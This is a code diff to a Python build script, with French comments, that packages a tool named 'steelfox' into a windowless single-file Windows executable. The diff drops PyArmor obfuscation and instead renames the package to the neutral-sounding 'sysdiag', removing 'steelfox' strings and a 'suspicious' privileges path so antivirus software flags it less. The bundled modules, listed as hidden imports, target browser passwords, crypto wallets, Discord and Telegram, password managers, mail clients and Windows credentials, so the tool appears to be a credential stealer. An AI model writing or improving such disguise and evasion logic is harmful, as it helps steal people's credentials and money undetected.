@@ -600,77 +600,81 @@ VSVersionInfo(
     ) -> Path:
         """Lance PyInstaller et retourne le chemin du .exe produit."""
         # Obfusquer le code pour réduire les faux positifs AV
-        self._set_status("Obfuscating code with PyArmor...", FG_DIM)
-        obf_dir = tmp / "steelfox_obf"
-        obf_cmd = [
-            sys.executable, "-m", "pyarmor", "obfuscate",
-            "--src", str(tmp / "steelfox"),
-            "--output", str(obf_dir),
-            "--recursive",
-        ]
-        result = subprocess.run(obf_cmd, cwd=str(tmp), capture_output=True, text=True)
-        if result.returncode != 0:
-            raise RuntimeError(
-                f"PyArmor obfuscation failed (code {result.returncode}).\n"
-                f"stdout: {result.stdout}\nstderr: {result.stderr}"
-            )
+        # ── Rename package steelfox → sysdiag in the temp build dir ──────────
+        # This removes all "steelfox" strings from the bundled code and replaces
+        # the suspicious _MEI*\steelfox\core\privileges.py path with a neutral one.
+        self._set_status("Preparing package...", FG_DIM)
+        src_pkg = tmp / "steelfox"
+        dst_pkg = tmp / "sysdiag"
+        if dst_pkg.exists():
+            shutil.rmtree(str(dst_pkg))
+        shutil.copytree(str(src_pkg), str(dst_pkg))
+        for py_file in dst_pkg.rglob("*.py"):
+            try:
+                text = py_file.read_text(encoding="utf-8", errors="ignore")
+                py_file.write_text(text.replace("steelfox", "sysdiag"), encoding="utf-8")
+            except Exception:
+                pass
+        # Patch the entry script's imports as well
+        if script.exists():
+            text = script.read_text(encoding="utf-8", errors="ignore")
+            script.write_text(text.replace("steelfox", "sysdiag"), encoding="utf-8")
 
-        # Utiliser le code obfusqué
-        steelfox_data = str(obf_dir) + os.pathsep + "steelfox"
+        pkg_data = str(dst_pkg) + os.pathsep + "sysdiag"
 
         cmd = [
             sys.executable, "-m", "PyInstaller",
             "--onefile",
-            "--windowed",                           # no console window
+            "--windowed",
             "--noconfirm",
             "--clean",
             "--name", name,
             "--distpath", str(tmp / "dist"),
             "--workpath", str(tmp / "build"),
             "--specpath", str(tmp),
-            "--paths",        str(obf_dir),         # steelfox/ obfusqué trouvable à l'import
-            "--add-data",     steelfox_data,         # embarquer tout le dossier steelfox/ obfusqué
+            "--paths",    str(dst_pkg.parent),
+            "--add-data", pkg_data,
             # ── Core ──
-            "--hidden-import", "steelfox",
-            "--hidden-import", "steelfox.core",
-            "--hidden-import", "steelfox.core.config",
-            "--hidden-import", "steelfox.core.module_base",
-            "--hidden-import", "steelfox.core.module_loader",
-            "--hidden-import", "steelfox.core.output",
-            "--hidden-import", "steelfox.core.privileges",
-            "--hidden-import", "steelfox.core.runner",
-            "--hidden-import", "steelfox.core.winapi",
+            "--hidden-import", "sysdiag",
+            "--hidden-import", "sysdiag.core",
+            "--hidden-import", "sysdiag.core.config",
+            "--hidden-import", "sysdiag.core.module_base",
+            "--hidden-import", "sysdiag.core.module_loader",
+            "--hidden-import", "sysdiag.core.output",
+            "--hidden-import", "sysdiag.core.privileges",
+            "--hidden-import", "sysdiag.core.runner",
+            "--hidden-import", "sysdiag.core.winapi",
             # ── Modules ──
-            "--hidden-import", "steelfox.modules",
-            "--hidden-import", "steelfox.modules.browsers",
-            "--hidden-import", "steelfox.modules.browsers.chromium",
-            "--hidden-import", "steelfox.modules.browsers.firefox",
-            "--hidden-import", "steelfox.modules.cloud",
-            "--hidden-import", "steelfox.modules.cloud.cloud_services",
-            "--hidden-import", "steelfox.modules.databases",
-            "--hidden-import", "steelfox.modules.databases.db_clients",
-            "--hidden-import", "steelfox.modules.devtools",
-            "--hidden-import", "steelfox.modules.devtools.dev_credentials",
-            "--hidden-import", "steelfox.modules.gaming",
-            "--hidden-import", "steelfox.modules.gaming.crypto_wallets",
-            "--hidden-import", "steelfox.modules.gaming.multimedia",
-            "--hidden-import", "steelfox.modules.gaming.platforms",
-            "--hidden-import", "steelfox.modules.mails",
-            "--hidden-import", "steelfox.modules.mails.mail_clients",
-            "--hidden-import", "steelfox.modules.messaging",
-            "--hidden-import", "steelfox.modules.messaging.apps",
-            "--hidden-import", "steelfox.modules.messaging.discord",
-            "--hidden-import", "steelfox.modules.messaging.telegram",
-            "--hidden-import", "steelfox.modules.network",
-            "--hidden-import", "steelfox.modules.network.wifi_vpn",
-            "--hidden-import", "steelfox.modules.passwords",
-            "--hidden-import", "steelfox.modules.passwords.managers",
-            "--hidden-import", "steelfox.modules.reconnaissance",
-            "--hidden-import", "steelfox.modules.reconnaissance.system_recon",
-            "--hidden-import", "steelfox.modules.sysadmin",
-            "--hidden-import", "steelfox.modules.sysadmin.remote_tools",
-            "--hidden-import", "steelfox.modules.windows",
-            "--hidden-import", "steelfox.modules.windows.credentials",
+            "--hidden-import", "sysdiag.modules",
+            "--hidden-import", "sysdiag.modules.browsers",
+            "--hidden-import", "sysdiag.modules.browsers.chromium",
+            "--hidden-import", "sysdiag.modules.browsers.firefox",
+            "--hidden-import", "sysdiag.modules.cloud",
+            "--hidden-import", "sysdiag.modules.cloud.cloud_services",
+            "--hidden-import", "sysdiag.modules.databases",
+            "--hidden-import", "sysdiag.modules.databases.db_clients",
+            "--hidden-import", "sysdiag.modules.devtools",
+            "--hidden-import", "sysdiag.modules.devtools.dev_credentials",
+            "--hidden-import", "sysdiag.modules.gaming",
+            "--hidden-import", "sysdiag.modules.gaming.crypto_wallets",
+            "--hidden-import", "sysdiag.modules.gaming.multimedia",
+            "--hidden-import", "sysdiag.modules.gaming.platforms",
+            "--hidden-import", "sysdiag.modules.mails",
+            "--hidden-import", "sysdiag.modules.mails.mail_clients",
+            "--hidden-import", "sysdiag.modules.messaging",
+            "--hidden-import", "sysdiag.modules.messaging.apps",
+            "--hidden-import", "sysdiag.modules.messaging.discord",
+            "--hidden-import", "sysdiag.modules.messaging.telegram",
+            "--hidden-import", "sysdiag.modules.network",
+            "--hidden-import", "sysdiag.modules.network.wifi_vpn",
+            "--hidden-import", "sysdiag.modules.passwords",
+            "--hidden-import", "sysdiag.modules.passwords.managers",
+            "--hidden-import", "sysdiag.modules.reconnaissance",
+            "--hidden-import", "sysdiag.modules.reconnaissance.system_recon",
+            "--hidden-import", "sysdiag.modules.sysadmin",
+            "--hidden-import", "sysdiag.modules.sysadmin.remote_tools",
+            "--hidden-import", "sysdiag.modules.windows",
+            "--hidden-import", "sysdiag.modules.windows.credentials",
         ]
         if icon:
             cmd += ["--icon", icon]
